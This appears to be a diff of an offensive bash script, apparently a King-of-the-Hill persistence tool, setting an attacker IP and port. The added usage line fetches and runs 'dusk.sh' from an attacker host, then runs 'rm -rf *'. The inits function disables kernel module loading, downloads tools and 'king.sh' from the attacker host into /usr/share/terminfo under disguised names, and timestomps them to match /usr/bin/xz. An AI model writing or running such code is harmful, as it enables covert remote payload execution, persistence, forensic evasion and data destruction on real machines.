@@ -1,5 +1,8 @@
 #!/usr/local/bin/bash
 
+
+# Usage: cp /bin/bash /usr/local/bin/bash && wget <ip>/dusk.sh && chmod +x dusk.sh && ./dusk.sh && rm -rf * 
+
 nick="Trevohack"
 IP="attacker_ip"
 PORT="9999"
@@ -32,7 +35,7 @@ function inits() {
     sysctl -w kernel.modules_disabled=1 >/dev/null 2>&1
     wget "$IP:$WEB_PORT/www/km" -O /usr/share/terminfo/azx >/dev/null 2>&1 && chmod +x /usr/share/terminfo/azx  >/dev/null 2>&1
     wget "$IP:$WEB_PORT/www/chattr" -O /usr/share/terminfo/axx >/dev/null 2>&1 && chmod +x /usr/share/terminfo/axx >/dev/null 2>&1
-    wget "$IP:$WEB_PORT/king/king.sh" -O /usr/share/terminfo/axz >/dev/null 2>&1 && chmod +x /usr/share/terminfo/axz >/dev/null 2>&1
+    wget "$IP:$WEB_PORT/www/king.sh" -O /usr/share/terminfo/axz >/dev/null 2>&1 && chmod +x /usr/share/terminfo/axz >/dev/null 2>&1
 
     touch -r /usr/bin/xz /usr/share/terminfo/azx >/dev/null 2>&1
     touch -r /usr/bin/xz /usr/share/terminfo/axx >/dev/null 2>&1
@@ -87,12 +90,9 @@ function protect() {
     fi
 }
 
-
-
-
-
 inits
 remove_king
 king
 protect
+
 
